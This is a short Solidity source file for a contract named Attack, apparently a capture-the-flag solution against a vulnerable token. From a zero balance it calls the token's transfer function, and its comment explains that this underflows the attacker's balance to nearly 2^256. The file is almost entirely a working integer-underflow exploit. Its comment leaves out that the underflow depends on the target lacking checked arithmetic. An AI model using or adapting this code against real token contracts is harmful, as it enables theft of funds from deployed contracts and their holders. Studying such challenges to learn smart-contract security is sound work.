// SPDX-License-Identifier: MIT
pragma solidity^0.8.4; 
interface IToken{
    function transfer(address, uint)external returns(bool);
}
contract Attack{
    function attack(IToken token)external{
        /*
        *contract Attack has no functs on his balance
        *so by transferign funds from his balance (which is 0)
        *we are making underflow
        *after achiving underflow, because uint (uint256) is used
        *his balance will be 2^256 - amout_that_we_transfer_to_ourselfs
        */
        token.transfer(msg.sender, 1000 );
    }
}